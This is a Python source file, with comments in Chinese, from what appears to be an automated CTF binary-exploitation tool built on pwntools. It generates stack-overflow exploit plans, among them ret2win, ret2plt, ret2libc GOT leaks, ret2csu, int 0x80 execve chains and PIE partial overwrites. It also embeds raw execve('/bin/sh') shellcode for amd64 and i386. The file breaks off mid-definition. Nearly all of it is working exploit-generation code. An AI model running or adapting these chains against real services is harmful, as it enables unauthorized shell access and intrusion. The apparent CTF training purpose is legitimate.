"""策略集合：每个函数产出若干 Plan（有序尝试），由 orchestrator 执行并验证。"""
from __future__ import annotations

import os

import re
from dataclasses import dataclass, field
from typing import Iterable, Optional

from pwn import ELF, ROP, asm, context, shellcraft

from .facts import Facts, Vuln
from .interact import Send, Wait, normalize_steps
from .model import Challenge

TERM_SINKS = ("gets", "scanf", "__isoc99_scanf", "fgets")


@dataclass
class Plan:
    strategy: str
    steps: list
    desc: str = ""
    tag: str = ""

    def __post_init__(self):
        # 兼容旧写法 Plan("x", [b"...", ...])：裸 bytes 自动包成 Send
        self.steps = normalize_steps(self.steps)

    @property
    def sends(self) -> list[bytes]:
        """只读兼容属性：按顺序取出所有 Send 的原始字节。"""
        return [s.data for s in self.steps if isinstance(s, Send)]

    @property
    def last_send(self) -> bytes:
        sends = self.sends
        return sends[-1] if sends else b""

    def __str__(self) -> str:
        return f"[{self.strategy}] {self.desc}"


# --------------------------------------------------------------------------- 公共
def _term(sink: str) -> bytes:
    return b"\n" if sink in TERM_SINKS else b""


def _offsets(ch: Challenge, f: Facts) -> list[tuple[int, str]]:
    """(offset, sink) 候选，静态推导优先，再补邻近值。"""
    out: list[tuple[int, str]] = []
    seen = set()
    step = ch.wordsize
    for v in sorted(f.vulns, key=lambda v: 0 if v.sink in ("gets", "read") else 1):
        if v.offset is None:
            continue
        # 读入长度不够覆盖到返回地址的，直接排除（否则会白跑几十次）
        if v.size_limit is not None and v.size_limit <= v.offset:
            continue
        for delta in (0, -step, step, -2 * step, 2 * step):
            off = v.offset + delta
            if off <= 0 or off > 0x400 or off in seen:
                continue
            if v.size_limit is not None and off >= v.size_limit:
                continue
            seen.add(off)
            out.append((off, v.sink))
    # v7.3.0：无静态证据时不再无条件兜底盲枚举。
    # 盲枚举会让「打不通」伪装成「试过了」，且失败不带任何归因；
    # 确实需要时用 --allow-brute 显式开启，并计入「盲试占比」指标。
    if not out and getattr(ch, "allow_brute", False) \
            and not any(v.offset for v in f.vulns):
        for off in range(step, 0x120, step):
            if off not in seen:
                seen.add(off)
                out.append((off, f.vulns[0].sink if f.vulns else "gets"))
    return out


def _presets(ch: Challenge, f: Facts) -> list[bytes]:
    """payload 之前需要先喂的输入（如 scanf("%d") 的长度）。"""
    has_scanf = any(v.sink in ("scanf", "__isoc99_scanf") for v in f.vulns)
    outs: list[bytes] = []
    if has_scanf:
        outs = [b"1024\n", b"1000\n", b"10\n", b"-1\n", b"0\n", b"1\n", b"128\n"]
    outs.append(b"")
    return outs


def _align(ch: Challenge, f: Facts, on: bool) -> bytes:
    if not on or ch.elf.bits != 64:
        return b""
    ret = f.gadgets.get("ret")
    return ch.p64(ret) if ret else ch.p64(0x400000 + 1)  # 万一没有 ret 就用无效值试一次


BAD_BYTES = {
    "gets": b"\n",
    "fgets": b"\n",
    "scanf": b" \t\n\x0b\x0c\r",
    "__isoc99_scanf": b" \t\n\x0b\x0c\r",
}


def _bad(ch: Challenge, sink: str) -> bytes:
    return BAD_BYTES.get(sink, b"")


def _pack_ok(ch: Challenge, val: int, sink: str) -> bool:
    bad = _bad(ch, sink)
    if not bad:
        return True
    raw = val.to_bytes(ch.wordsize, "little")
    return not any(b in raw for b in bad)


def _pick_addr(ch: Challenge, f: Facts, sink: str, key: str, fallback: int = None) -> Optional[int]:
    """在同类 gadget 里挑一个打包后不含坏字节的地址。"""
    cands = list(f.gadget_alts.get(key) or [])
    if fallback:
        cands.append(fallback)
    for a in cands:
        if _pack_ok(ch, a, sink):
            return a
    return cands[0] if cands else fallback


def _pick_val(ch: Challenge, sink: str, val: int) -> Optional[int]:
    return val if _pack_ok(ch, val, sink) else None


def _clean_bss(ch: Challenge, sink: str, base: int, span: int = 0x800) -> Optional[int]:
    """在 bss 范围内挑一个打包后不含坏字节的地址。"""
    for delta in range(0, span, ch.wordsize):
        addr = base + delta
        if _pack_ok(ch, addr, sink):
            return addr
    return base


def _pad(ch: Challenge, off: int) -> bytes:
    return b"A" * off


def _csu_block(ch: Challenge, f: Facts, func_got: int,
               a1: int, a2: int, a3: int, nxt: int) -> bytes:
    """按 __libc_csu_init 实际的寄存器映射拼一个 call 块。

    pops: rbx, rbp, r12(func), r13, r14, r15 —— 但 rdi/rsi/rdx 由谁提供随编译器而变。
    """
    A, B, mapping = f.csu
    regs = {"rbx": 0, "rbp": 1, "r12": func_got, "r13": 0, "r14": 0, "r15": 0}
    regs[mapping["rdi"]] = a1
    regs[mapping["rsi"]] = a2
    regs[mapping["rdx"]] = a3
    return (ch.p64(A) + ch.p64(regs["rbx"]) + ch.p64(regs["rbp"]) + ch.p64(regs["r12"])
            + ch.p64(regs["r13"]) + ch.p64(regs["r14"]) + ch.p64(regs["r15"])
            + ch.p64(B) + ch.p64(0) * 7 + ch.p64(nxt))


# --------------------------------------------------------------------------- 1. ret2win
def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
    win = f.shell_win
    if win is None or ch.elf.pie:
        return
    menu = _prelude_variants(f)
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(win.addr) + _term(sink)
                for m, prompt in menu:
                    steps = ([Send(m), Wait(prompt)] if m else []) + ([Send(pre)] if pre else [])
                    steps.append(Send(payload))
                    yield Plan("ret2win", steps,
                               f"jump to {win.evidence} @ {hex(win.addr)} off={off} "
                               f"align={int(align)}" + (f" menu={m!r}" if m else "")
                               + (f" prompt={prompt!r}" if prompt else ""))


# --------------------------------------------------------------------------- 0. 纯 int 0x80（无 libc）
def _sys_vuln(ch: Challenge, f: Facts):
    """这类题的前置条件：i386 + 自写 read 包装 + 装载块 + 可写数据段 + 漏洞函数入口。"""
    if ch.elf.bits != 32:
        return None
    if not (f.sys_read and f.sys_load and f.data_addr):
        return None
    v = next((x for x in f.vulns if x.sink == "read" and x.offset and x.size_limit), None)
    if not v or not v.func_entry:
        return None
    return v


def _stage_read_data(ch: Challenge, f: Facts, v, count: int) -> bytes:
    """read(0, .data, count) 把 "/bin/sh\0"+0 写进数据段，然后回漏洞函数继续读。

    这一步同时解决两件事：给 execve 的 filename 备料、并把 data+8 之后清成 0（当 argv 数组）。
    """
    off, limit = v.offset, v.size_limit
    buf = bytearray(b"A" * limit)
    buf[off:off + 4] = ch.p32(f.sys_read)
    buf[off + 4:off + 8] = ch.p32(v.func_entry)
    buf[off + 8:off + 0xc] = ch.p32(0)
    buf[off + 0xc:off + 0x10] = ch.p32(f.data_addr)
    buf[off + 0x10:off + 0x14] = ch.p32(count)
    return bytes(buf)


def _blob_binsh(limit: int) -> bytes:
    return b"/bin/sh\x00".ljust(limit, b"\x00")


def s_syscall_direct(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """窗口够宽（limit >= off+0x18）时，一次 read 就能同时喂满 execve 三个参数。

    read(0, .data, argv) 只发 11 字节 -> 返回 11 -> eax=11 -> 进装载块
    -> execve("/bin/sh", {NULL}, NULL)
    """
    v = _sys_vuln(ch, f)
    if not v:
        return
    off, limit = v.offset, v.size_limit
    if limit < off + 0x18:
        return
    argv = f.data_addr + 8
    buf = bytearray(b"A" * limit)
    buf[off:off + 4] = ch.p32(f.sys_read)
    buf[off + 4:off + 8] = ch.p32(f.sys_load)
    buf[off + 8:off + 0xc] = ch.p32(0)                 # fd
    buf[off + 0xc:off + 0x10] = ch.p32(f.data_addr)     # buf / 之后作 ebx
    buf[off + 0x10:off + 0x14] = ch.p32(argv)           # count / 之后作 ecx
    buf[off + 0x14:off + 0x18] = ch.p32(0)              # edx = envp
    yield Plan("syscall1",
               [_stage_read_data(ch, f, v, limit), _blob_binsh(limit),
                bytes(buf), b"/bin/sh\x00\x00\x00\x00"],
               f"int80 execve one-shot: data={hex(f.data_addr)} off={off} limit={limit}")


def s_syscall_execve(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """窗口刚好「返回地址 + 4 个 dword」（limit == off+0x14）时的三段式（0CTF 2016 welcome）。

    直接 read(返回 11)->int80 会让栈帧右移 4 字节，envp 槽位正好掉出窗口一个 dword。
    绕过：先把 0 种在「下一段窗口外一格」，再重入 _start 让帧整体下移 entry_sub，
    于是下一段里 envp 槽位读到的就是这个 0。
    """
    v = _sys_vuln(ch, f)
    if not v or not f.entry_sub:
        return
    off, limit = v.offset, v.size_limit
    if limit != off + 0x14:
        return

    plant = off + 0x14 - f.entry_sub
    if not (0 <= plant + 4 <= limit):
        return

    hop = bytearray(b"A" * limit)
    hop[off:off + 4] = ch.p32(ch.elf.entry)
    hop[plant:plant + 4] = ch.p32(0)

    final = bytearray(b"A" * limit)
    final[off:off + 4] = ch.p32(f.sys_read)
    final[off + 4:off + 8] = ch.p32(f.sys_load)
    final[off + 8:off + 0xc] = ch.p32(0)
    final[off + 0xc:off + 0x10] = ch.p32(f.data_addr)
    final[off + 0x10:off + 0x14] = ch.p32(f.data_addr + 8)

    yield Plan("syscall3",
               [_stage_read_data(ch, f, v, limit), _blob_binsh(limit),
                bytes(hop), bytes(final), b"/bin/sh\x00\x00\x00\x00"],
               f"int80 execve 3-stage: data={hex(f.data_addr)} off={off} "
               f"plant={plant} entry_sub={hex(f.entry_sub)}")


# --------------------------------------------------------------------------- 0c. PIE + 无泄漏 -> 部分覆盖返回地址
def _prelude_variants(f: Facts) -> list:
    """菜单式程序需要先发选择字符（'w\\n'）才进得去漏洞函数。

    返回 [(menu_bytes, prompt_bytes)] 候选；prompt 是该函数的入口提示串
    （v7.1.0），有则策略用 `Wait(prompt)` 精确等待，无则退化 `Wait()`（盲等静默）。
    没有菜单的题返回 [(b"", b"")]。
    """
    seen, out = set(), []
    prompts = getattr(f, "prompts", {}) or {}
    for entry, prefs in (getattr(f, "interact", {}) or {}).items():
        pr = (prompts.get(entry) or prompts.get(None) or [])
        prompt = pr[0] if pr else b""
        for p in prefs:
            if (p, prompt) not in seen:
                seen.add((p, prompt))
                out.append((p, prompt))
    return out or [(b"", b"")]


def _gate_offsets(f: Facts, v) -> list:
    """把 `cmp dword ptr [rbp-X], imm` 换算成「缓冲区里的偏移」。"""
    out = []
    for disp, val in getattr(f, "gates", []) or []:
        off = disp - v.buf_disp
        if 0 <= off and off + 4 <= (v.offset or 0):
            out.append((off, val))
    return out


def s_pie_partial_win(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """PIE + 没有任何泄漏 + 存在 win 函数：只覆盖「栈上已有的那个返回地址」的低 2 字节。

    为什么必须这么做：win 与返回地址在同一个 64K 内（否则覆盖不到），但基址每次随机，
    低 16 位里的那个 0x1000 位未知 —— 只能枚举 16 种（本地进程可直接读 /proc/pid/maps 算准）。

    另外两件事：
      * 体里若有 `cmp dword ptr [rbp-X], imm` 校验，必须把 imm 一起写回去，否则走不到 leave;ret
      * ret 进入函数比 call 进入的 rsp 高 8，`system` 里 movaps 会崩 -> 用跳过 push rbp 的入口
    """
    if not ch.elf.pie:
        return
    w = f.shell_win or next((x for x in f.wins if x.kind == "flag"), None)
    if w is None:
        return
    v = next((x for x in f.vulns if x.offset), None)
    if not v or not v.func_entry:
        return
    rets = f.callers.get(v.func_entry) or []
    if not rets:
        return
    ret_addr = rets[0]
    if (ret_addr >> 16) != (w.addr >> 16):
        return                     # 不同 64K，低 2 字节覆盖够不着

    targets = []
    if getattr(w, "alt", 0) and (w.alt >> 8) == (w.addr >> 8):
        targets.append(w.alt)      # 先试对齐版本
    targets.append(w.addr)

    # 远程只能猜基址的 0x1000 位；本地进程可直接读 /proc/pid/maps，不用猜
    blind = bool(getattr(ch, "host", None)) or bool(os.environ.get("AUTOPWN_NO_MAPS"))
    # 盲打时每次连接都是新基址，每次只有 1/16 命中：多跑两轮把命中率抬到 ~98%
    nibs = list(range(16)) * 2 if blind else [-1]
    for tgt in targets:
        for nib in nibs:
            yield Plan("pie_partial", [], tag=f"pie:{tgt}:{nib}:{w.kind}",
                       desc=f"partial ret -> {hex(tgt)} off={v.offset} "
                            f"(ret={hex(ret_addr)}, nib={nib}, kind={w.kind})")


# --------------------------------------------------------------------------- 1a. ret2win(PIE 局部覆盖)
def s_ret2win_pie(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """PIE + 无泄漏：只覆盖返回地址的低 1~2 字节，跳到同一页/同一 64K 内的 win 函数。

    适用前提：溢出函数是被 main 直接调用的（返回地址落在二进制内），
    这样返回地址与 win 函数的低字节可比。
    """
    win = f.shell_win
    if not ch.elf.pie or win is None:
        return
    for v in f.vulns:
        if not v.offset or not v.func_entry:
            continue
        rets = f.callers.get(v.func_entry) or []
        for ret_addr in rets[:2]:
            if (ret_addr & 0xFF00) == (win.addr & 0xFF00):
                nbytes, val = 1, win.addr & 0xFF
            elif (ret_addr & 0xFFFF) >> 8 == (win.addr & 0xFFFF) >> 8:
                nbytes, val = 2, win.addr & 0xFFFF
            else:
                continue
            payload = _pad(ch, v.offset) + val.to_bytes(nbytes, "little")
            yield Plan("ret2win_pie", [payload + _term(v.sink)],
                       f"partial overwrite {nbytes}B -> {hex(win.addr)} "
                       f"(ret={hex(ret_addr)}) off={v.offset}")


# --------------------------------------------------------------------------- 1a2. 守卫（逻辑校验题）
def s_guard_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """输入直接满足 win 路径上的判定条件（题三长度+字节、题一全局门）。

    载荷全部由 `guard.build_guard_payload` 从约束构造：不写死偏移/值。
    """
    from .guard import build_guard_payload
    for g in getattr(f, "guards", []) or []:
        if g.status != "solved":
            continue
        payload = build_guard_payload(ch, g)
        if payload is None:
            continue
        kind = g.kind if g.kind in ("shell", "flag") else "shell"
        yield Plan("guard_write", [payload + _term(g.sink)],
                   f"guard {g.sink}@{hex(g.sink_call)} -> {g.kind} len={len(payload)}",
                   tag=f"guard:{kind}")


def s_guard_fmt(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """fmt 写全局门（题七）：先探 %p 序号，再按约束写 global=val。

    探针拿不到序号就不产出计划（不盲猜）；blob 含换行或超出 read 容量时
    `guard.fmt_payload` 返回 None。
    """
    from .guard import fmt_payload
    guards = [g for g in getattr(f, "guards", []) or [] if g.status == "fmt"]
    if not guards:
        return
    from .run import run_capture
    out = run_capture(ch, b"AAAA." + b".%p" * 24 + b"\n", timeout=1.0)
    idx = _fmt_offset(out)
    if not idx:
        return
    for g in guards:
        for ws in ("byte", "short", "int"):
            blob = fmt_payload(ch, g, idx, ws)
            if not blob:
                continue
            kind = g.kind if g.kind in ("shell", "flag") else "shell"
            yield Plan("guard_fmt", [blob],
                       f"guard fmt {g.arg}@{hex(g.call)} arg#{idx} write={ws}",
                       tag=f"guard:{kind}")


def s_guard_backfill(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """strncmp 回填（题六）：程序打印随机串后要求输入它的前缀。

    steps 为空 —— 动态交互（读 token、回填、判定）由 orchestrator 的
    `_try_guard_backfill` 负责。参数编码进结构化 tag（C2：不新增 Plan.meta）。
    """
    for b in getattr(f, "backfills", []) or []:
        if b.status != "backfill":
            continue
        yield Plan("guard_backfill", [],
                   f"backfill {b.n}B -> {b.marker!r} @ {hex(b.call)}",
                   tag=f"guard:backfill:{b.n}:{b.marker.hex()}")


# --------------------------------------------------------------------------- 1b. ret2flag
def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """只打印 flag 的题（函数体是 system("cat flag")）——不算 shell，单独记账。"""
    if ch.elf.pie:
        return
    for w in f.wins:
        if w.kind != "flag":
            continue
        targets = [w.addr] + ([w.alt] if getattr(w, "alt", 0) else [])
        menu = _prelude_variants(f)
        for off, sink in _offsets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                for tgt in targets:
                    payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(tgt) + _term(sink)
                    for m, prompt in menu:
                        steps = ([Send(m), Wait(prompt)] if m else []) + [Send(payload)]
                        yield Plan("ret2flag", steps,
                                   f"jump to {w.evidence} @ {hex(tgt)} off={off} align={int(align)}"
                                   + (f" menu={m!r}" if m else "")
                                   + (f" prompt={prompt!r}" if prompt else ""), tag="flag")


# --------------------------------------------------------------------------- 1c. 诱饵 win
def s_ret2win_decoy(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """诱饵 win（`system("echo flag")` 这类）：**每道题只打 1 次**。

    只产出「控制流真的到达 win」的证据（echo 参数回显），不产出 flag，
    由 `oracle.judge_win_executed` 固定 `ok=False`、`cause="win_executed"`。
    载荷取静态偏移，不做邻近枚举；同一函数里排在目标 sink 之前的输入，
    先喂一个 `b"0\\n"` 占位，保证溢出发生在最后一次 read/gets/scanf 上
    （否则会被后面的输入覆盖）。
    """
    for w in f.wins:
        if w.kind != "decoy":
            continue
        m = re.search(r'echo\s+([^")\\]*)', w.evidence or "")
        marker = m.group(1).strip().encode("latin-1", "replace") if m else b""
        if not marker:
            # 拿不到 echo 的参数就没法判「win 真的执行了」，不产出假证据
            return
        groups: dict[int, list[Vuln]] = {}
        for v in f.vulns:
            if v.func_entry is None or v.offset is None:
                continue
            if v.size_limit is not None and v.size_limit <= v.offset:
                continue
            groups.setdefault(v.func_entry, []).append(v)
        if not groups:
            return
        ent = max(groups, key=lambda e: max(v.call_addr for v in groups[e]))
        seq = sorted(groups[ent], key=lambda v: v.call_addr)
        vul = seq[-1]
        steps = [Send(b"0\n")] * (len(seq) - 1)
        payload = _pad(ch, vul.offset) + ch.p64(w.addr) + _term(vul.sink)
        steps.append(Send(payload))
        yield Plan("ret2decoy", steps,
                   f"jump to decoy ({w.evidence}) @ {hex(w.addr)} "
                   f"off={vul.offset} pre={len(seq) - 1}",
                   tag=f"decoy:{marker.hex()}")


# --------------------------------------------------------------------------- 2. ret2system@plt
def s_ret2plt(ch: Challenge, f: Facts) -> Iterable[Plan]:
    system = ch.plt("system")
    if not system or f.binsh is None:
        return
    pop_rdi = f.gadgets.get("pop_rdi")
    if ch.elf.bits == 64 and not pop_rdi:
        return
    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                if ch.elf.bits == 64:
                    payload = (_pad(ch, off) + _align(ch, f, align)
                               + ch.p64(pop_rdi) + ch.p64(f.binsh) + ch.p64(system))
                else:
                    payload = (_pad(ch, off) + ch.p32(system) + ch.p32(0) + ch.p32(f.binsh))
                sends = [pre] if pre else []
                yield Plan("ret2plt", sends + [payload + _term(sink)],
                           f"system('/bin/sh') via pop_rdi off={off} align={int(align)}")


# --------------------------------------------------------------------------- 3. system(bss) after gets/read(bss)
def s_ret2gets(ch: Challenge, f: Facts) -> Iterable[Plan]:
    system = ch.plt("system")
    if not system:
        return
    gets = ch.plt("gets")
    read = ch.plt("read")
    if not (gets or read):
        return
    bss = _writable(ch)
    if not bss:
        return
    g = f.gadgets
    pop_rdi = g.get("pop_rdi")

    for off, sink in _offsets(ch, f):
        for pre in _presets(ch, f):
            if gets and (ch.elf.bits == 32 or pop_rdi):
                if ch.elf.bits == 64:
                    payload = (_pad(ch, off) + _align(ch, f, True)
                               + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(gets)
                               + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(system))
                else:
                    payload = (_pad(ch, off) + ch.p32(gets) + ch.p32(system)
                               + ch.p32(bss) + ch.p32(0))
                sends = ([pre] if pre else []) + [payload + _term(sink), b"/bin/sh\x00\n"]
                yield Plan("ret2gets", sends,
                           f"gets({hex(bss)}) -> system off={off}")

            if read and ch.elf.bits == 64 and pop_rdi and g.get("pop_rsi") and g.get("pop_rdx"):
                payload = (_pad(ch, off) + _align(ch, f, True)
                           + ch.p64(pop_rdi) + ch.p64(0)
                           + ch.p64(g["pop_rsi"]) + ch.p64(bss)
                           + ch.p64(g["pop_rdx"]) + ch.p64(0x100)
                           + ch.p64(read)
                           + ch.p64(pop_rdi) + ch.p64(bss) + ch.p64(system))
                sends = ([pre] if pre else []) + [payload + _term(sink), b"/bin/sh\x00"]
                yield Plan("ret2read", sends,
                           f"read(0,{hex(bss)},0x100) -> system off={off}")


# --------------------------------------------------------------------------- 4. ret2csu
def s_ret2csu(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if ch.elf.bits != 64 or not f.csu:
        return
    system = ch.plt("system")
    if not system:
        return
    bss = _writable(ch)
    if not bss:
        return
    def block(func_got: int, arg1: int, arg2: int, arg3: int, nxt: int) -> bytes:
        return _csu_block(ch, f, func_got, arg1, arg2, arg3, nxt)

    # 写入函数：gets(bss) 或 read(0,bss,0x100)
    writers = []
    if ch.plt("gets") and ch.got("gets"):
        writers.append(("gets", ch.got("gets"), (bss, 0, 0)))
    if ch.plt("read") and ch.got("read"):
        writers.append(("read", ch.got("read"), (0, bss, 0x100)))
    got_system = ch.got("system")
    if not got_system:
        return
    for name, got_w, args in writers:
        for off, sink in _offsets(ch, f):
            for pre in _presets(ch, f):
                chain = (block(got_w, *args, A)
                         + block(got_system, bss, 0, 0, 0))
                payload = _pad(ch, off) + chain
                tail = b"/bin/sh\x00\n" if name == "gets" else b"/bin/sh\x00"
                sends = ([pre] if pre else []) + [payload + _term(sink), tail]
                yield Plan("ret2csu", sends, f"csu {name}({hex(bss)}) -> system off={off}")


# --------------------------------------------------------------------------- 4b. 全局写 → 间接调用槽 → win（v7.4.2 缺口 B）
def s_global_write_win(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """`gets/strcpy` 写全局缓冲区，附近有可写的全局函数指针槽：覆写槽位为 win。

    事实全部来自 `f.global_writes` / `f.global_calls`（无 Dis、无猜测）：
      * 只有 `0 < slot-buf` 且写满后能覆盖到槽（`gap + wordsize <= limit`，若 limit 已知）；
      * 距离上限 0x400，最多产出 12 个计划（避免拖垮其它策略的尝试预算）；
      * `strcpy/strcat/sprintf` 是 C 串，跳转地址含 NUL 时写不进去，跳过；
      * 成功仍由 oracle 判「真执行命令」，槽被调用的副作用不算证据。
    """
    win = f.shell_win
    writes = list(getattr(f, "global_writes", []) or [])
    calls = list(getattr(f, "global_calls", []) or [])
    if win is None or not writes or not calls:
        return
    pairs = []
    for buf, sink, call, limit in writes:
        span = min(limit or 0x400, 0x400)
        for slot, icall in calls:
            gap = slot - buf
            if not (0 < gap <= span):
                continue
            if limit is not None and gap + ch.wordsize > limit:
                continue
            pairs.append((gap, buf, sink, call, slot, icall))
    seen = set()
    for gap, buf, sink, call, slot, icall in sorted(pairs):
        key = (buf, slot, sink)
        if key in seen:
            continue
        seen.add(key)
        if len(seen) > 12:
            break
        if not _pack_ok(ch, win.addr, sink):
            continue
        raw = win.addr.to_bytes(ch.wordsize, "little")
        if sink in ("strcpy", "strcat", "sprintf") and b"\x00" in raw:
            continue
        payload = b"A" * gap + raw + _term(sink)
        for m, prompt in _prelude_variants(f):
            steps = ([Send(m), Wait(prompt)] if m else []) + [Send(payload)]
            yield Plan("global_write_win", steps,
                       f"global {sink}@{hex(call)} buf={hex(buf)} -> "
                       f"slot {hex(slot)} @ {hex(icall)} = {hex(win.addr)} gap={gap}"
                       + (f" menu={m!r}" if m else ""))


# --------------------------------------------------------------------------- 5b. ret2libc（write 三参数泄漏）
def s_ret2libc_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """没有 puts 只有 write 时：write(1, got, 8) 泄漏，再回 main 打 system。"""
    if ch.elf.pie or ch.libc_elf is None:
        return
    # 远程 socket 下 stdout 是「全缓冲」，puts 泄漏会卡在缓冲区里发不出来；
    # 只有本地 tty（行缓冲）才优先用 puts。远程一律先试 write。
    if ch.plt("puts") and not getattr(ch, "host", None):
        return
    write = ch.plt("write")
    main = ch.var("main")
    if not write or not main:
        return
    got = ch.got("write") or ch.got("read")
    if not got:
        return
    # 远程无 libc 文件：write 泄漏之外再多泄一个 GOT（printf/read），供 low12
    # 指纹识别远程 libc（v7.0.4 同款；write 泄漏 8 字节可带多槽）
    remote_no_libc = bool(getattr(ch, "host", None)) and not ch.libc_path
    got2 = None
    if remote_no_libc and ch.elf.bits == 64:
        got2 = ch.got("printf") or ch.got("read") or ch.got("puts")
        if got2 == got:
            got2 = None
    g = f.gadgets
    base_chain = None
    if ch.elf.bits == 64 and g.get("pop_rdi") and g.get("pop_rsi") and g.get("pop_rdx"):
        base_chain = (ch.p64(g["pop_rdi"]) + ch.p64(1)
                      + ch.p64(g["pop_rsi"]) + ch.p64(got)
                      + ch.p64(g["pop_rdx"]) + ch.p64(8)
                      + ch.p64(write))
        if got2:
            base_chain += (ch.p64(g["pop_rdi"]) + ch.p64(1)
                           + ch.p64(g["pop_rsi"]) + ch.p64(got2)
                           + ch.p64(g["pop_rdx"]) + ch.p64(8)
                           + ch.p64(write))
        base_chain += ch.p64(main)
    elif ch.elf.bits == 64 and f.csu:
        got_write = ch.got("write")
        if got_write:
            if got2:
                # csu 双泄：两块连用时第二块不能重复 p64(A)（pop 槽错位），
                # 直接续 6 参数 + call 块（手工实证 ae3f24d3）。
                A, B_, _m = f.csu
                blk2 = (ch.p64(0) + ch.p64(1) + ch.p64(got_write)
                        + ch.p64(8) + ch.p64(got2) + ch.p64(1)
                        + ch.p64(B_) + ch.p64(0) * 7 + ch.p64(main))
                base_chain = (_csu_block(ch, f, got_write, 1, got, 8, A) + blk2)
            else:
                base_chain = _csu_block(ch, f, got_write, 1, got, 8, main)
    elif ch.elf.bits == 32:
        base_chain = (ch.p32(write) + ch.p32(main) + ch.p32(1) + ch.p32(got) + ch.p32(8))
    if not base_chain:
        return
    for off, sink in _offsets(ch, f):
        presets = _presets(ch, f)
        if got2:
            presets = [b""]        # 远程双泄：跳过 scanf preset（与 s_ret2libc 同理）
        for pre in presets:
            payload = _pad(ch, off) + _align(ch, f, ch.elf.bits == 64) + base_chain
            sends = ([pre] if pre else []) + [payload + _term(sink)]
            extra = "+%#x" % got2 if got2 else ""
            yield Plan("ret2libc_write", sends,
                       f"write(1, {hex(got)}{extra}, 8) leak off={off}",
                       tag=f"stage1:write:{off}:{sink}")


# --------------------------------------------------------------------------- 5. ret2libc
def s_ret2libc(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """两阶段：泄漏 GOT -> 回主函数 -> system('/bin/sh')。

    这是一个「会执行两次」的特殊策略：Plan 带 tag=stage1，由 orchestrator 识别。
    远程且用户没给 libc 时，stage1 额外多泄一个 GOT（printf），供 low12 指纹识别
    远程 libc 版本（v7.0.4）——本地 / 自带 libc 的路径保持单泄不变。
    """
    if ch.elf.pie or ch.libc_elf is None:
        return
    main = ch.var("main")
    if not main:
        return
    leak_plt = ch.plt("puts") or ch.plt("write")
    leak_name = "puts" if ch.plt("puts") else ("write" if ch.plt("write") else None)
    if not leak_plt or not leak_name:
        return
    got = ch.got(leak_name)
    pop_rdi = f.gadgets.get("pop_rdi")
    if not got or (ch.elf.bits == 64 and not pop_rdi):
        return
    # 双泄条件：远程 + 用户没给 libc 文件（ch.libc_elf 是容器兜底 libc）
    remote_no_libc = bool(getattr(ch, "host", None)) and not ch.libc_path
    got2 = ch.got("printf") if remote_no_libc and ch.elf.bits == 64 else None
    if remote_no_libc and ch.elf.bits == 64 and not got2:
        return
    for off, sink in _offsets(ch, f):
        presets = _presets(ch, f)
        if got2:
            # 远程双泄 plan：scanf preset 会把 cont 喂成非 0 值直接退出循环
            # （repeater 实测 1024 → puts(stupid) → 程序结束），破坏三阶段时序。
            # read sink 的溢出本来就不需要 preset，远程只跑干净 payload。
            presets = [b""]
        for m, prompt in _prelude_variants(f):
            if m:
                presets = [b""]      # 已过菜单，下一条输入直接就是 payload
            for pre in presets:
                if ch.elf.bits == 64:
                    chain = ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
                    if got2:
                        chain += ch.p64(pop_rdi) + ch.p64(got2) + ch.p64(leak_plt)
                    payload = _pad(ch, off) + _align(ch, f, True) + chain + ch.p64(main)
                else:
                    payload = (_pad(ch, off) + ch.p32(leak_plt) + ch.p32(main) + ch.p32(got))
                sends = ([Send(m), Wait(prompt)] if m else []) \
                    + ([pre] if pre else []) + [payload + _term(sink)]
                extra = "+printf" if got2 else ""
                yield Plan("ret2libc", sends,
                           f"leak {leak_name}{extra}@{hex(got)} off={off}"
                           + (f" menu={m!r}" if m else ""),
                           tag=f"stage1:{leak_name}:{off}:{sink}")


# --------------------------------------------------------------------------- 6. ret2shellcode
# 直接用 execve("/bin/sh", 0, 0)：比 shellcraft.sh() 更短且不依赖栈上 argv 构造
SC_AMD64 = bytes.fromhex("4831f65648bf2f62696e2f2f7368574889e74831d26a3b580f05")
SC_I386 = bytes.fromhex("31c050682f2f7368682f62696e89e389c1505389e131d26a0b58cd80")


def _shellcode(ch: Challenge) -> bytes:
    return SC_AMD64 if ch.elf.bits == 64 else SC_I386


def s_shellcode(ch: Challenge, f: Facts) -> Iterable[Plan]:
    target = f.mmap_rwx
    if not target:
        return
    sc = _shellcode(ch)
    for v in f.vulns:
        if v.sink != "read" or v.offset is None:
            continue
        # 第一段 read 把 shellcode 读进 RWX 区，第二段溢出返回地址跳到 RWX
        limit = v.size_limit or 0x100
        blob = sc.ljust(min(max(limit, len(sc)), 0x400), b"\x90")
        for pre in _presets(ch, f):
            payload = _pad(ch, v.offset) + ch.p64(target) + _term(v.sink)
            sends = ([pre] if pre else []) + [blob, payload]
            yield Plan("shellcode", sends,
                       f"shellcode -> {hex(target)} off={v.offset} size={len(blob)}")



GADGET_REGS = {
    "pop_eax": ["eax"],
    "pop_ebx": ["ebx"],
    "pop_ecx": ["ecx"],
    "pop_edx": ["edx"],
    "pop_ecx_ebx": ["ecx", "ebx"],
    "pop_ebx_edx": ["ebx", "edx"],
    "pop_edx_ecx": ["edx", "ecx"],
}


def _i386_syscall_chain(ch: Challenge, f: Facts, sink: str, binsh: int) -> Optional[bytes]:
